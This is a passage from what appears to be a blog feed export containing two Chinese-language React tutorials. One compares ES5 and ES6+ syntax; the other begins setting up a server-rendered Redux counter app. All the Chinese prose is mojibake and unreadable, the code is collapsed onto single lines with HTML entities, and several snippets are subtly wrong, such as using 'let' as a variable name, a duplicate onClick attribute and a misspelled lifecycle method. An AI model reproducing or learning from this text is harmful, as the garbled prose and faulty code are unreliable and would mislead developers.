åœ¨ ES6+ ä¸­æˆ‘å€‘åˆå§‹åŒ– state æœ‰å…©ç¨®å¯«æ³•ï¼š
class Todo extends React.Component &#123;    state = &#123;        maxLength: this.props.maxLength,    &#125;&#125;

å¦å¤–ä¸€ç¨®å¯«æ³•ï¼Œä½¿ç”¨åœ¨å»ºæ§‹å¼åˆå§‹åŒ–ã€‚æ¯”è¼ƒæ¨è–¦ä½¿ç”¨é€™ç¨®æ–¹å¼ï¼Œæ–¹ä¾¿åšä¸€äº›é‹ç®—ï¼š
class Todo extends React.Component &#123;    constructor(props)&#123;        super(props);        this.state = &#123;            maxLength: this.props.maxLength,        &#125;;    &#125;&#125;


6. Arrow functionsåœ¨è¬› Arrow functions ä¹‹å‰ï¼Œæˆ‘å€‘å…ˆèŠèŠåœ¨ React ä¸­ this å’Œå®ƒæ‰€ä»£è¡¨çš„ contextã€‚åœ¨ ES5 ä¸­ï¼Œæˆ‘å€‘ä½¿ç”¨ React.createClass() ä¾†å»ºç«‹ Componentï¼Œè€Œåœ¨ React.createClass() ä¸‹ï¼Œé è¨­å¹«ä½ ç¶å®šå¥½ method çš„ thisï¼Œä½ æ¯‹é ˆè‡ªè¡Œç¶å®šã€‚æ‰€ä»¥ä½ å¯ä»¥çœ‹åˆ°åƒæ˜¯ä¸‹é¢çš„ä¾‹å­ï¼Œcallback function handleButtonClick ä¸­çš„  this æ˜¯æŒ‡åˆ° component çš„å¯¦ä¾‹ï¼ˆinstanceï¼‰ï¼Œè€Œéè§¸ç™¼äº‹ä»¶çš„ç‰©ä»¶ï¼š
var TodoBtn = React.createClass(&#123;    handleButtonClick: function(e) &#123;        // æ­¤ this æŒ‡åˆ° component çš„å¯¦ä¾‹ï¼ˆinstanceï¼‰ï¼Œè€Œé button        this.setState(&#123;showOptionsModal: true&#125;);    &#125;,    render: function()&#123;        return (            &lt;div&gt;                &lt;Button onClick=&#123;this.handleButtonClick&#125;&gt;&#123;this.props.label&#125;&lt;/Button&gt;            &lt;/div&gt;        )    &#125;,&#125;);

ç„¶è€Œè‡ªå‹•ç¶å®šé€™ç¨®æ–¹å¼åè€Œæœƒè®“äººå®¹æ˜“èª¤è§£ï¼Œæ‰€ä»¥åœ¨ ES6+ æ¨è–¦ä½¿ç”¨ bind  ç¶å®š this æˆ–ä½¿ç”¨ Arrow functionsï¼ˆå®ƒæœƒç»‘å®šç•¶å‰ scope çš„ this contextï¼‰å…©ç¨®æ–¹å¼ï¼Œä½ å¯ä»¥åƒè€ƒä¸‹é¢ä¾‹å­ï¼š
class TodoBtn extends React.Component&#123;    handleButtonClick(e)&#123;        // ç¢ºèªç¶å®š this æŒ‡åˆ° component instance        this.setState(&#123;toggle: true&#125;);    &#125;    render()&#123;        // é€™é‚Šå¯ä»¥ç”¨ this.handleButtonClick.bind(this) æ‰‹å‹•ç¶å®šæˆ–æ˜¯ Arrow functions () =&gt; &#123;&#125; ç”¨æ³•        return (            &lt;div&gt;                &lt;Button onClick=&#123;this.handleButtonClick.bind(this)&#125; onClick=&#123;(e)=&gt; &#123;this.handleButtonClick(e)&#125; &#125;&gt;&#123;this.props.label&#125;&lt;/Button&gt;            &lt;/div&gt;        )    &#125;,&#125;

Arrow functions é›–ç„¶ä¸€é–‹å§‹çœ‹èµ·ä¾†æœ‰é»æ€ªç•°ï¼Œä½†å…¶å¯¦è§€å¿µå¾ˆç°¡å–®ï¼šä¸€å€‹ç°¡åŒ–çš„å‡½æ•¸ã€‚å‡½æ•¸åŸºæœ¬ä¸Šå°±æ˜¯åƒæ•¸ï¼ˆä¸ä¸€å®šè¦æœ‰åƒæ•¸ï¼‰ã€è¡¨é”å¼ã€å›å‚³å€¼ï¼ˆä¹Ÿå¯èƒ½æ˜¯å›å‚³ undefinedï¼‰ï¼š
// Arrow functions çš„ä¸€äº›ä¾‹å­()=&gt;7e=&gt;e+2()=&gt;&#123;    alert(&#x27;XD&#x27;);&#125;(a,b)=&gt;a+be=&gt;&#123;    if (e == 2)&#123;        return 2;    &#125;    return 100/e;&#125;

ä¸éè¦æ³¨æ„çš„æ˜¯ç„¡è«–æ˜¯ bind æˆ–æ˜¯ Arrow functionsï¼Œæ¯æ¬¡åŸ·è¡Œå›å‚³éƒ½æ˜¯æŒ‡åˆ°ä¸€å€‹æ–°çš„å‡½æ•¸ï¼Œè‹¥éœ€è¦å†èª¿ç”¨åˆ°é€™å€‹å‡½æ•¸ï¼Œè«‹è¨˜å¾—å…ˆæŠŠå®ƒå­˜èµ·ä¾†ï¼š
éŒ¯èª¤ç”¨æ³•ï¼š
class TodoBtn extends React.Component&#123;    componentWillMount()&#123;        Btn.addEventListener(&#x27;click&#x27;, this.handleButtonClick.bind(this));    &#125;    componentDidmount()&#123;        Btn.removeEventListener(&#x27;click&#x27;, this.handleButtonClick.bind(this));    &#125;    onAppPaused(event)&#123;    &#125;&#125;

æ­£ç¢ºç”¨æ³•ï¼š
class TodoBtn extends React.Component&#123;    constructor(props)&#123;        super(props);        this.handleButtonClick = this.handleButtonClick.bind(this);    &#125;    componentWillMount()&#123;        Btn.addEventListener(&#x27;click&#x27;, this.handleButtonClick);    &#125;    componentDidmount()&#123;        Btn.removeEventListener(&#x27;click&#x27;, this.handleButtonClick);    &#125;&#125;

æ›´å¤š Arrows and Lexical This ç‰¹æ€§å¯ä»¥åƒè€ƒé€™å€‹æ–‡ä»¶ã€‚
7. Dynamic property names &amp; template stringsä»¥å‰åœ¨ ES5 æˆ‘å€‘è¦å‹•æ…‹è¨­å®šå±¬æ€§åç¨±æ™‚ï¼Œå¾€å¾€éœ€è¦å¤šå¯«å¹¾è¡Œç¨‹å¼ç¢¼æ‰èƒ½é”åˆ°ç›®æ¨™ï¼š
var Todo = React.createClass(&#123;  onChange: function(inputName, e) &#123;    var stateToSet = &#123;&#125;;    stateToSet[inputName + &#x27;Value&#x27;] = e.target.value;    this.setState(stateToSet);  &#125;,&#125;);

ä½†åœ¨ ES6+ä¸­ï¼Œé€é enhancements to object literals å’Œ template strings å¯ä»¥è¼•é¬†å®Œæˆå‹•æ…‹è¨­å®šå±¬æ€§åç¨±çš„ä»»å‹™ï¼š
class Todo extends React.Component &#123;  onChange(inputName, e) &#123;    this.setState(&#123;      [`$&#123;inputName&#125;Value`]: e.target.value,    &#125;);  &#125;&#125;

Template Strings æ˜¯ä¸€ç¨®èªæ³•ç³–ï¼ˆsyntactic sugarï¼‰ï¼Œæ–¹ä¾¿æˆ‘å€‘çµ„ç¹”å­—ä¸²ï¼ˆé€™é‚Šä¹Ÿç”¨ä¸Š letã€const è®Šæ•¸å’Œå¸¸æ•¸å®£å‘Šçš„æ–¹å¼ï¼Œå’Œ var çš„ function scope ä¸åŒçš„æ˜¯å®ƒå€‘æ˜¯å±¬æ–¼ block scopeï¼Œäº¦å³ç”Ÿå­˜åŸŸå­˜åœ¨æ–¼ &#123;&#125; é–“ï¼‰ï¼š
// Interpolate variable bindingsconst name = &quot;Bob&quot;, let = &quot;today&quot;;`Hello $&#123;name&#125;, how are you $&#123;time&#125;?` \\ Hello Bob, how are you today?


8. Destructuring &amp; spread attributesåœ¨ React çš„ Component ä¸­ï¼Œçˆ¶å…ƒä»¶åˆ©ç”¨ props ä¾†å‚³éè³‡æ–™åˆ°å­å…ƒä»¶æ˜¯å¸¸è¦‹ä½œæ³•ï¼Œç„¶è€Œæˆ‘å€‘æœ‰æ™‚æœƒå¸Œæœ›åªå‚³ééƒ¨åˆ†è³‡æ–™ï¼Œæ­¤æ™‚ ES6+ ä¸­çš„ Destructuring å’Œ JSX çš„ Spread Attributes
 ï¼Œ... Spread Attributes ä¸»è¦æ˜¯ç”¨ä¾†è¿­ä»£ç‰©ä»¶ï¼š
class Todo extends React.Component &#123;  render() &#123;    var &#123;      className,      ...others,  // ...others åŒ…å« this.props é™¤äº† className å¤–æ‰€æœ‰å€¼ã€‚this.props = &#123;value: &#x27;true&#x27;, title: &#x27;header&#x27;, className: &#x27;content&#x27;&#125;    &#125; = this.props;    return (      &lt;div className=&#123;className&#125;&gt;        &lt;TodoList &#123;...others&#125; /&gt;        &lt;button onClick=&#123;this.handleLoadMoreClick&#125;&gt;Load more&lt;/button&gt;      &lt;/div&gt;    );  &#125;&#125;

ä½†ä½¿ç”¨ä¸Šè¦æ³¨æ„çš„æ˜¯è‹¥æ˜¯æœ‰é‡è¤‡çš„å±¬æ€§å€¼å‰‡ä»¥å¾Œä¾†è¦†è“‹ï¼Œä¸‹é¢çš„ä¾‹å­ä¸­è‹¥ ...this.propsï¼Œæœ‰ classNameï¼Œå‰‡è¢«å¾Œä¾†çš„ main æ‰€è¦†è“‹ï¼š
&lt;div &#123;...this.props&#125; className=&quot;main&quot;&gt;  â€¦&lt;/div&gt;

è€Œ Destructuring ä¹Ÿå¯ä»¥ç”¨åœ¨ç°¡åŒ– Module çš„å¼•å…¥ä¸Šï¼Œé€™é‚Šæˆ‘å€‘å…ˆç”¨ ES5 ä¸­å¼•å…¥æ–¹å¼ä¾†çœ‹ï¼š
var React = require(&#x27;react-native&#x27;);var Component = React.component; class HelloWorld extends Component &#123;  render() &#123;    return (      &lt;View&gt;        &lt;Text&gt;Hello, world!&lt;/Text&gt;      &lt;/View&gt;    );  &#125;&#125; export default HelloWorld;

ä»¥ä¸‹ ES5 å¯«æ³•ï¼š
var React = require(&#x27;react-native&#x27;);var View = React.View;

åœ¨ ES6+ å‰‡å¯ä»¥ç›´æ¥ä½¿ç”¨ Destructuring é€™ç¨®ç°¡åŒ–æ–¹å¼ä¾†å¼•å…¥æ¨¡çµ„ä¸­çš„å…ƒä»¶ï¼š
// é€™é‚Šç­‰æ–¼ä¸Šé¢çš„å¯«æ³•var &#123; View &#125; = require(&#x27;react-native&#x27;);

æ›´é€²ä¸€æ­¥å¯ä»¥ä½¿ç”¨ import èªæ³•ï¼š
import React, &#123;	View,	Component,	Text,&#125; from &#x27;react-native&#x27;;class HelloWorld extends Component &#123;  render() &#123;    return (      &lt;View&gt;        &lt;Text&gt;Hello, world!&lt;/Text&gt;      &lt;/View&gt;    );  &#125;&#125; export default HelloWorld;


9. Mixinsåœ¨ ES5 ä¸­ï¼Œæˆ‘å€‘å¯ä»¥ä½¿ç”¨ Mixins çš„æ–¹å¼å»è®“ä¸åŒçš„ Component å…±ç”¨ç›¸ä¼¼çš„åŠŸèƒ½ï¼Œé‡ç”¨æˆ‘å€‘çš„ç¨‹å¼ç¢¼ï¼š
var PureRenderMixin = require(&#x27;react-addons-pure-render-mixin&#x27;);React.createClass(&#123;  mixins: [PureRenderMixin],  render: function() &#123;    return &lt;div className=&#123;this.props.className&#125;&gt;foo&lt;/div&gt;;  &#125;&#125;);

ä½†ç”±æ–¼å®˜æ–¹ä¸æ‰“ç®—åœ¨ ES6+ ä¸­ç¹¼çºŒæ¨è¡Œ Mixinsï¼Œè‹¥é‚„æ˜¯å¸Œæœ›ä½¿ç”¨ï¼Œå¯ä»¥åƒè€ƒçœ‹çœ‹ç¬¬ä¸‰æ–¹å¥—ä»¶æˆ–æ˜¯é€™å€‹æ–‡ä»¶çš„ç”¨æ³•ã€‚
10. Default Parametersä»¥å‰ ES5 æˆ‘å€‘å‡½æ•¸è¦ä½¿ç”¨é è¨­å€¼éœ€è¦é€™æ¨£ä½¿ç”¨ï¼š
var link = function (height, color) &#123;      var height = height || 50;      var color = color || &#x27;red&#x27;;  &#125;  

ç¾åœ¨ ES6+ çš„å‡½æ•¸å¯ä»¥æ”¯æ´é è¨­å€¼ï¼Œè®“ç¨‹å¼ç¢¼æ›´ç‚ºç°¡æ½”ï¼š
var link = function(height = 50, color = &#x27;red&#x27;) &#123;    ...  &#125; 

ç¸½çµä»¥ä¸Šå°±æ˜¯ React ES5ã€ES6+å¸¸è¦‹ç”¨æ³•å°ç…§è¡¨ï¼Œèƒ½çœ‹åˆ°é€™é‚Šçš„ä½ æ‡‰è©²å·²ç¶“å°æ–¼ React ES5ã€ES6 ä½¿ç”¨ä¸Šæœ‰äº›èªè­˜ï¼Œå…ˆçµ¦è‡ªå·±ä¸€äº›æŒè²å§ï¼ç¢ºå¯¦å¾ ES6 é–‹å§‹ï¼ŒJavaScript å’Œä»¥å‰æˆ‘å€‘çœ‹åˆ°çš„ JavaScript æœ‰äº›ä¸åŒï¼Œå¢åŠ äº†è¨±å¤šæ–°çš„ç‰¹æ€§ï¼Œæœ‰äº›è®€è€…ç”šè‡³æœƒå¾ˆæ‡·ç–‘èªªé€™çœŸçš„æ˜¯ JavaScript å—ï¼ŸES6 çš„ç”¨æ³•å°æ–¼åˆå­¸è€…ä¾†èªªå¯èƒ½æœƒéœ€è¦å¯«ä¸€é»æ™‚é–“å¸æ”¶ï¼Œä¸‹é¢æˆ‘å¹«å¤§å®¶æº–å‚™äº†å»¶ä¼¸é–±è®€ï¼Œæ–¹ä¾¿å¤§å®¶é€²ä¸€æ­¥åƒè€ƒå­¸ç¿’ã€‚æ¥ä¸‹ä¾†æˆ‘å€‘ä¹Ÿæœƒæœ‰ä¸€ç³»åˆ—å¾é›¶é–‹å§‹å­¸ React çš„æ–‡ç« ä¾†å¸¶å¤§å®¶ç”±æ·ºå…¥æ·±å­¸ç¿’ ReactJS ç”Ÿæ…‹ç³»ï¼Œé‹ç”¨ JavaScript æ‰“é€ è·¨å¹³å°æ‡‰ç”¨ç¨‹å¼ã€‚ç­†è€…æ‰æ›¸å­¸æ·ºï¼Œè‹¥æœ‰ç–æ¼æ­¡è¿å¤§å®¶ä¸€èµ·äº¤æµè¨è«–ï¼šï¼‰
å»¶ä¼¸é–±è®€
React&#x2F;React Native çš„ES5 ES6å†™æ³•å¯¹ç…§è¡¨
React on ES6+
react native ä¸­es6è¯­æ³•è§£æ 
Learn ES2015
ECMAScript 6å…¥é—¨
Reactå®˜æ–¹ç¶²ç«™
React INTRO TO REACT.JS
React.createClass versus extends React.Component
react-native-coding-style
Airbnb React&#x2F;JSX Style Guide
å¾é›¶é–‹å§‹å­¸ Reactï¼ˆReactJS 101ï¼‰

é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ï¼Œç›®å‰å°ˆæ³¨åœ¨ Mobile å’Œ IoT æ‡‰ç”¨é–‹ç™¼ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>React, React Native, ES5, ES6, ES7, JavaScript, ECMAScript2015, Webpack</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¸€çœ‹å°±æ‡‚çš„ React Server Renderingï¼ˆIsomorphic JavaScriptï¼‰å…¥é–€æ•™å­¸</title>
    <url>/2016/08/27/react-redux-immutablejs-node-server-isomorphic-tutorial/</url>
    <content><![CDATA[
å‰è¨€ç”±æ–¼å¯èƒ½æœ‰äº›è®€è€…æ²’è½é Isomorphic JavaScript ã€‚å› æ­¤åœ¨é€²åˆ°é–‹ç™¼ React Redux Sever Rendering æ‡‰ç”¨ç¨‹å¼çš„ä¸»é¡Œä¹‹å‰æˆ‘å€‘å…ˆä¾†èŠèŠ Isomorphic JavaScript é€™å€‹è­°é¡Œã€‚
æ ¹æ“š Isomorphic JavaScript é€™å€‹ç¶²ç«™çš„èªªæ˜ï¼š

Isomorphic JavaScript apps are JavaScript applications that can run both client-side and server-side.The backend and frontend share the same code. 

Isomorphic JavaScript ä¿‚æŒ‡ç€è¦½å™¨ç«¯å’Œä¼ºæœå™¨ç«¯å…±ç”¨ JavaScript çš„ç¨‹å¼ç¢¼ã€‚
å¦å¤–ï¼Œé™¤äº† Isomorphic JavaScript å¤–ï¼Œè®€è€…æˆ–è¨±ä¹Ÿæœ‰è½é Universal JavaScript é€™å€‹ç”¨è©ã€‚é‚£ä»€éº¼æ˜¯ Universal JavaScript å‘¢ï¼Ÿå®ƒå’Œ Isomorphic JavaScript æ˜¯æŒ‡ä¸€æ¨£çš„æ„æ€å—ï¼Ÿé‡å°é€™å€‹è­°é¡Œç¶²è·¯ä¸Šæœ‰äº›é–‹ç™¼è€…æå‡ºäº†è‡ªå·±çš„è§€é»ï¼š Universal JavaScriptã€Isomorphism vs Universal JavaScriptã€‚å…¶ä¸­ Isomorphism vs Universal JavaScript é€™ç¯‡æ–‡ç« çš„ä½œè€… Gert Hengeveld æŒ‡å‡º Isomorphic JavaScript ä¸»è¦æ˜¯æŒ‡å‰å¾Œç«¯å…±ç”¨ JavaScript çš„é–‹ç™¼æ–¹å¼ï¼Œè€Œ Universal JavaScript æ˜¯æŒ‡ JavaScript ç¨‹å¼ç¢¼å¯ä»¥åœ¨ä¸åŒç’°å¢ƒä¸‹é‹è¡Œï¼Œé€™ç•¶ç„¶åŒ…å«ç€è¦½å™¨ç«¯å’Œä¼ºæœå™¨ç«¯ï¼Œç”šè‡³å…¶ä»–ç’°å¢ƒã€‚ä¹Ÿå°±æ˜¯èªª Universal JavaScript åœ¨æ„ç¾©ä¸Šå¯ä»¥æ¶µè“‹çš„æ¯” Isomorphic JavaScript æ›´å»£æ³›ä¸€äº›ï¼Œç„¶è€Œåœ¨ Github æˆ–æ˜¯è¨±å¤šæŠ€è¡“è¨è«–ä¸Šé€šå¸¸æœƒæŠŠå…©è€…è¦–ç‚ºåŒä¸€ä»¶äº‹æƒ…ï¼Œé€™éƒ¨ä»½ä¹Ÿè«‹è®€è€…ç•™æ„ã€‚
Isomorphic JavaScript çš„å¥½è™•åœ¨é–‹å§‹çœŸæ­£æ’°å¯« Isomorphic JavaScript å‰æˆ‘å€‘åœ¨é€²ä¸€æ­¥æ¢è¨ä½¿ç”¨ Isomorphic JavaScript æœ‰å“ªäº›å¥½è™•ï¼Ÿåœ¨è«‡å¥½è™•ä¹‹å‰ï¼Œæˆ‘å€‘å…ˆçœ‹çœ‹æœ€æ—© Web é–‹ç™¼æ˜¯å¦‚ä½•è™•ç†é é¢æ¸²æŸ“å’Œ state ç®¡ç†ï¼Œé‚„æœ‰é‡åˆ°å“ªäº›æŒ‘æˆ°ã€‚
æœ€æ—©çš„æ™‚å€™æˆ‘å€‘è«‡è«– Web å¾ˆå–®ç´”ï¼Œéƒ½æ˜¯ç”± Server ç«¯é€²è¡Œæ¨¡ç‰ˆçš„è™•ç†ï¼Œä½ å¯ä»¥æƒ³æˆ template æ˜¯ä¸€å€‹å‡½æ•¸ï¼Œæˆ‘å€‘å‚³é€è³‡æ–™é€²å»ï¼Œtemplate æœ€å¾Œç”¢ç”Ÿä¸€å¼µ HTML çµ¦ç€è¦½å™¨é¡¯ç¤ºã€‚ä¾‹å¦‚ï¼šNode ä½¿ç”¨çš„ï¼ˆEJSã€Jadeï¼‰ã€Python&#x2F;Django çš„ Template æˆ–æ›¿ä»£æ–¹æ¡ˆ Jinjaã€PHP çš„ Smartyã€Laravel ä½¿ç”¨çš„ Bladeï¼Œç”šè‡³æ˜¯ Ruby on Rails ç”¨çš„ ERBã€‚éƒ½æ˜¯ç”±å¾Œç«¯å» render æ‰€æœ‰è³‡æ–™å’Œé é¢ï¼Œå‰ç«¯è™•ç†ç›¸å°å–®ç´”ã€‚
ç„¶è€Œéš¨è‘—å‰ç«¯å·¥ç¨‹çš„è»Ÿé«”å·¥ç¨‹åŒ–å’Œä½¿ç”¨è€…é«”é©—çš„è¦æ±‚ï¼Œé–‹å§‹å‡ºç¾å„å¼å‰ç«¯æ¡†æ¶çš„ç™¾èŠ±é½Šæ”¾ï¼Œä¾‹å¦‚ï¼šBackbone.jsã€Ember.js å’Œ Angular.js ç­‰å‰ç«¯ MVC (Model-View-Controller) æˆ– MVVM (Model-View-ViewModel) æ¡†æ¶ï¼Œå°‡é é¢æ–¼å‰ç«¯æ¸²æŸ“çš„ä¸åˆ·é å–®é å¼æ‡‰ç”¨ç¨‹å¼ï¼ˆSingle Page Appï¼‰ä¹Ÿå› æ­¤é–‹å§‹æµè¡Œã€‚
å¾Œç«¯é™¤äº†æä¾›åˆå§‹çš„ HTML å¤–ï¼Œé‚„æä¾› API Server è®“å‰ç«¯æ¡†æ¶å¯ä»¥å–å¾—è³‡æ–™ç”¨æ–¼å‰ç«¯ templateã€‚è¤‡é›œçš„é‚è¼¯ç”± ViewModel&#x2F;Presenter ä¾†è™•ç†ï¼Œå‰ç«¯ template åªè™•ç†ç°¡å–®çš„æ˜¯å¦é¡¯ç¤ºæˆ–æ˜¯å…ƒç´ è¿­ä»£çš„ç‹€æ³ï¼Œå¦‚ä¸‹åœ–æ‰€ç¤ºï¼š

ç„¶è€Œå‰ç«¯æ¸²æŸ“ template é›–ç„¶æœ‰å®ƒçš„å¥½è™•ä½†ä¹Ÿé‡åˆ°ä¸€äº›å•é¡ŒåŒ…æ‹¬æ•ˆèƒ½ã€SEO ç­‰è­°é¡Œã€‚æ­¤æ™‚æˆ‘å€‘å°±é–‹å§‹æ€è€ƒ Isomorphic JavaScript çš„å¯èƒ½æ€§ï¼šç‚ºä»€éº¼æˆ‘å€‘ä¸èƒ½å‰å¾Œç«¯éƒ½ä½¿ç”¨ JavaScript ç”šè‡³æ˜¯ Reactï¼Ÿ

äº‹å¯¦ä¸Šï¼ŒReact çš„å„ªå‹¢å°±åœ¨æ–¼å®ƒå¯ä»¥å¾ˆå„ªé›…åœ°å¯¦ç¾ Server Side Rendering é”åˆ° Isomorphic JavaScript çš„æ•ˆæœã€‚åœ¨ react-dom/server ä¸­æœ‰å…©å€‹æ–¹æ³• renderToString å’Œ renderToStaticMarkup å¯ä»¥åœ¨ server ç«¯æ¸²æŸ“ä½ çš„ componentsã€‚å…¶ä¸»è¦éƒ½æ˜¯å°‡ React Component åœ¨ Server ç«¯è½‰æˆ DOM Stringï¼Œä¹Ÿå¯ä»¥å°‡ props å¾€ä¸‹å‚³ï¼Œç„¶è€Œäº‹ä»¶è™•ç†æœƒå¤±æ•ˆï¼Œè¦åˆ° client-side çš„ React æ¥æ”¶åˆ°å¾Œæ‰æœƒæŠŠå®ƒåŠ ä¸Šå»ï¼ˆä½†è¦æ³¨æ„ server-side å’Œ client-side çš„ checksum è¦ä¸€è‡´ä¸ç„¶æœƒå‡ºç¾éŒ¯èª¤ï¼‰ï¼Œé€™æ¨£ä¸€ä¾†å¯ä»¥æé«˜æ¸²æŸ“é€Ÿåº¦å’Œ SEO æ•ˆæœã€‚renderToString å’Œ renderToStaticMarkup æœ€å¤§çš„å·®ç•°åœ¨æ–¼ renderToStaticMarkup æœƒå°‘åŠ ä¸€äº› React å…§éƒ¨ä½¿ç”¨çš„ DOM å±¬æ€§ï¼Œä¾‹å¦‚ï¼šdata-react-idï¼Œå› æ­¤å¯ä»¥ç¯€çœä¸€äº›è³‡æºã€‚
ä½¿ç”¨ renderToString é€²è¡Œ Server ç«¯æ¸²æŸ“ï¼š
import ReactDOMServer from &#x27;react-dom/server&#x27;;ReactDOMServer.renderToString(&lt;HelloButton name=&quot;Mark&quot; /&gt;);

æ¸²æŸ“å‡ºä¾†çš„æ•ˆæœï¼š
&lt;button data-reactid=&quot;.7&quot; data-react-checksum=&quot;762752829&quot;&gt;  Hello, Mark&lt;/button&gt;

ç¸½çš„ä¾†èªªä½¿ç”¨ Isomorphic JavaScript æœƒæœ‰ä»¥ä¸‹çš„å¥½è™•ï¼š

æœ‰åŠ©æ–¼ SEO
Rendering é€Ÿåº¦è¼ƒå¿«ï¼Œæ•ˆèƒ½è¼ƒä½³
æ”¾æ£„è¹©è…³çš„ Template èªæ³•æ“æŠ± Component å…ƒä»¶åŒ–æ€è€ƒï¼Œä¾¿æ–¼ç¶­è­·
ç›¡é‡å‰å¾Œç«¯å…±ç”¨ç¨‹å¼ç¢¼ç¯€çœé–‹ç™¼æ™‚é–“

ä¸éè¦æ³¨æ„çš„æ˜¯å¦‚æœæœ‰ä½¿ç”¨ Redux åœ¨ Server Side Rendering ä¸­ï¼Œå…¶æµç¨‹ç›¸å°è¤‡é›œï¼Œä¸éå¤§è‡´æµç¨‹å¦‚ä¸‹ï¼šç”±å¾Œç«¯é å…ˆè¼‰å…¥éœ€è¦çš„ initialStateï¼Œç”±æ–¼ Server æ¸²æŸ“å¿…é ˆå…¨éƒ¨éƒ½è½‰æˆ stringï¼Œæ‰€ä»¥å…ˆå°‡ state å…ˆ dehydrationï¼ˆè„«æ°´ï¼‰ï¼Œç­‰åˆ° client ç«¯å† rehydrationï¼ˆè¦†æ°´ï¼‰ï¼Œé‡å»º store å¾€ä¸‹å‚³åˆ°å‰ç«¯çš„ React Componentã€‚
è€Œè¦æŠŠè³‡æ–™å¾ä¼ºæœå™¨ç«¯å‚³éåˆ°å®¢æˆ¶ç«¯ï¼Œæˆ‘å€‘éœ€è¦ï¼š

æŠŠå–å¾—åˆå§‹ state ç•¶åšåƒæ•¸ä¸¦å°æ¯å€‹è«‹æ±‚å»ºç«‹ä¸€å€‹å…¨æ–°çš„ Redux store å¯¦é«”
é¸æ“‡æ€§åœ° dispatch ä¸€äº› action 
æŠŠ state å¾ store å–å‡ºä¾†
æŠŠ state ä¸€èµ·å‚³åˆ°å®¢æˆ¶ç«¯

æ¥ä¸‹ä¾†æˆ‘å€‘å°±é–‹å§‹å‹•æ‰‹å¯¦ä½œä¸€å€‹ç°¡å–®çš„ React Server Side Rendering Counter æ‡‰ç”¨ç¨‹å¼ã€‚
å°ˆæ¡ˆæˆæœæˆªåœ–
ç’°å¢ƒå®‰è£èˆ‡è¨­å®š
å®‰è£ Node å’Œ NPM

å®‰è£æ‰€éœ€å¥—ä»¶
 $ npm install --save react react-dom redux react-redux react-router immutable redux-immutable redux-actions redux-thunk babel-polyfill babel-register body-parser express morgan qs

 $ npm install --save-dev babel-core babel-eslint babel-loader babel-preset-es2015 babel-preset-react babel-preset-stage-1 eslint eslint-config-airbnb eslint-loader eslint-plugin-import eslint-plugin-jsx-a11y eslint-plugin-react html-webpack-plugin webpack webpack-dev-server redux-logger

æ¥ä¸‹ä¾†æˆ‘å€‘å…ˆè¨­å®šä¸€ä¸‹é–‹ç™¼æ–‡æª”ã€‚

è¨­å®š Babel çš„è¨­å®šæª”ï¼š .babelrc
 &#123;	&quot;presets&quot;: [  	&quot;es2015&quot;,  	&quot;react&quot;, 	],	&quot;plugins&quot;: []&#125;

è¨­å®š ESLint çš„è¨­å®šæª”å’Œè¦å‰‡ï¼š .eslintrc
 &#123;  &quot;extends&quot;: &quot;airbnb&quot;,  &quot;rules&quot;: &#123;    &quot;react/jsx-filename-extension&quot;: [1, &#123; &quot;extensions&quot;: [&quot;.js&quot;, &quot;.jsx&quot;] &#125;],  &#125;,  &quot;env&quot; :&#123;    &quot;browser&quot;: true,  &#125;&#125;

è¨­å®š Webpack è¨­å®šæª”ï¼š webpack.config.js
 // è®“ä½ å¯ä»¥å‹•æ…‹æ’å…¥ bundle å¥½çš„ .js æª”åˆ° .index.htmlconst HtmlWebpackPlugin = require(&#x27;html-webpack-plugin&#x27;);const HTMLWebpackPluginConfig = new HtmlWebpackPlugin(&#123;  template: `$&#123;__dirname&#125;/src/index.html`,  filename: &#x27;index.html&#x27;,  inject: &#x27;body&#x27;,&#125;);// entry ç‚ºé€²å…¥é»ï¼Œoutput ç‚ºé€²è¡Œå®Œ eslintã€babel loader è½‰è­¯å¾Œçš„æª”æ¡ˆä½ç½®module.exports = &#123;  entry: [    &#x27;./src/index.js&#x27;,  ],  output: &#123;    path: `$&#123;__dirname&#125;/dist`,    filename: &#x27;index_bundle.js&#x27;,  &#125;,  module: &#123;    preLoaders: [      &#123;        test: /\.jsx$|\.js$/,        loader: &#x27;eslint-loader&#x27;,        include: `$&#123;__dirname&#125;/src`,        exclude: /bundle\.js$/      &#125;    ],    loaders: [&#123;      test: /\.js$/,      exclude: /node_modules/,      loader: &#x27;babel-loader&#x27;,      query: &#123;        presets: [&#x27;es2015&#x27;, &#x27;react&#x27;],      &#125;,    &#125;],  &#125;,  // å•Ÿå‹•é–‹ç™¼æ¸¬è©¦ç”¨ server è¨­å®šï¼ˆä¸èƒ½ç”¨åœ¨ productionï¼‰  devServer: &#123;    inline: true,    port: 8008,  &#125;,  plugins: [HTMLWebpackPluginConfig],&#125;;

å¤ªå¥½äº†ï¼é€™æ¨£æˆ‘å€‘å°±å®Œæˆäº†é–‹ç™¼ç’°å¢ƒçš„è¨­å®šå¯ä»¥é–‹å§‹å‹•æ‰‹å¯¦ä½œ React Server Side Rendering Counter æ‡‰ç”¨ç¨‹å¼äº†ï¼	
å…ˆçœ‹ä¸€ä¸‹æˆ‘å€‘æ•´å€‹å°ˆæ¡ˆçš„è³‡æ–™çµæ§‹ï¼Œæˆ‘å€‘æŠŠæ•´å€‹å°ˆæ¡ˆåˆ†æˆä¸‰å€‹ä¸»è¦çš„è³‡æ–™å¤¾ï¼ˆclientã€serverï¼Œé‚„æœ‰å…±ç”¨ç¨‹å¼ç¢¼çš„ commonï¼‰ï¼š

å‹•æ‰‹å¯¦ä½œé¦–å…ˆï¼Œæˆ‘å€‘å…ˆå®šç¾©äº† client çš„ index.jsï¼š
